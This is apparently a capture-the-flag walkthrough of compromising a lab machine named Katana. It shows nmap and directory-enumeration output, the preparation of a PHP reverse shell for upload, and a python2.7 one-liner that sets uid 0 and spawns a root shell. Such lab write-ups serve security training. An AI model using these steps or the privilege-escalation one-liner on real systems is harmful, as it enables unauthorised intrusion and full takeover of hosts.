```bash
➜  sudo nmap -sCV -T4 -A -O -p- 192.168.200.83 -oA nmap-results
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-24 20:44 EAT
Warning: 192.168.200.83 giving up on port because retransmission cap hit (6).
Stats: 0:08:59 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 69.87% done; ETC: 20:57 (0:03:52 remaining)
Nmap scan report for 192.168.200.83
Host is up (0.16s latency).
Not shown: 65528 closed tcp ports (reset)
PORT      STATE    SERVICE  VERSION
21/tcp    open     ftp      vsftpd 3.0.3
22/tcp    open     ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 89:4f:3a:54:01:f8:dc:b6:6e:e0:78:fc:60:a6:de:35 (RSA)
|   256 dd:ac:cc:4e:43:81:6b:e3:2d:f3:12:a1:3e:4b:a3:22 (ECDSA)
|_  256 cc:e6:25:c0:c6:11:9f:88:f6:c4:26:1e:de:fa:e9:8b (ED25519)
80/tcp    open     http     Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Katana X
7080/tcp  open     ssl/http LiteSpeed httpd
| tls-alpn: 
|   h2
|   spdy/3
|   spdy/2
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=katana/organizationName=webadmin/countryName=US
| Not valid before: 2020-05-11T13:57:36
|_Not valid after:  2022-05-11T13:57:36
|_http-title: Katana X
|_http-server-header: LiteSpeed
8088/tcp  open     http     LiteSpeed httpd
|_http-title: Katana X
|_http-server-header: LiteSpeed
8715/tcp  open     http     nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: 401 Authorization Required
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=Restricted Content
11119/tcp filtered unknown
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=4/24%OT=21%CT=1%CU=37269%PV=Y%DS=4%DC=T%G=Y%TM=6629
OS:484A%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=108%TI=Z%II=I%TS=A)SEQ(S
OS:P=101%GCD=1%ISR=108%TI=Z%II=I%TS=7)SEQ(SP=101%GCD=1%ISR=108%TI=Z%II=I%TS
OS:=A)OPS(O1=M551ST11NW7%O2=M551ST11NW7%O3=M551NNT11NW7%O4=M551ST11NW7%O5=M
OS:551ST11NW7%O6=M551ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE
OS:88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M551NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=
OS:S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=N)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%
OS:O=%RD=0%Q=)T6(R=N)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPC
OS:K=G%RUCK=624C%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 4 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 3389/tcp)
HOP RTT       ADDRESS
1   160.55 ms 192.168.45.1
2   159.71 ms 192.168.45.254
3   160.55 ms 192.168.251.1
4   160.57 ms 192.168.200.83

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 858.32 seconds
```

```bash
curl -I http://192.168.200.83/
```

![image](https://gist.github.com/assets/58165365/b308f718-d510-4cb2-aa18-fcce6fb938fd)

```bash
feroxbuster -u http://192.168.200.83/
```

![image](https://gist.github.com/assets/58165365/6c87c932-8488-4532-a02d-5759235a4d92)

![image](https://gist.github.com/assets/58165365/768f8d30-d93d-41a9-ab84-902bbedf3723)

```bash
feroxbuster -u http://192.168.200.83:8088 -x php -x html
```

![image](https://gist.github.com/assets/58165365/8bc6cc98-4171-4ae7-bca3-b14c8f2ebc83)

![image](https://gist.github.com/assets/58165365/93a5cc14-5ca9-44d7-9abb-ab5aecfedf34)

```bash
➜  cp /usr/share/webshells/php/php-reverse-shell.php .
➜  vi php-reverse-shell.php 
➜  mv php-reverse-shell.php upload.php
```

![image](https://gist.github.com/assets/58165365/f483abc1-ec19-410a-9c59-810c480fa8f5)

![image](https://gist.github.com/assets/58165365/84dee312-f19d-4185-8ebf-dca28eb7b0ab)

![image](https://gist.github.com/assets/58165365/9f04b2f2-8841-4198-b406-0e01b77a5232)

[linpeas.sh](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS)

![image](https://gist.github.com/assets/58165365/1f2b1b45-0a15-49aa-bda2-5d21453ada20)

![image](https://gist.github.com/assets/58165365/a2820a15-6236-4b1e-9378-925dee5b7830)

![image](https://gist.github.com/assets/58165365/35e46bae-51ad-4ca5-b106-d2ef9d04fe6f)

![image](https://gist.github.com/assets/58165365/ab42bb52-3f17-4e79-9f9a-aa00e2a09cca)

![image](https://gist.github.com/assets/58165365/d29f88f4-8b44-4a95-80be-451b3f8454dc)

```bash
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

![image](https://gist.github.com/assets/58165365/70b872fe-d4bf-4806-b1ad-366811771c13)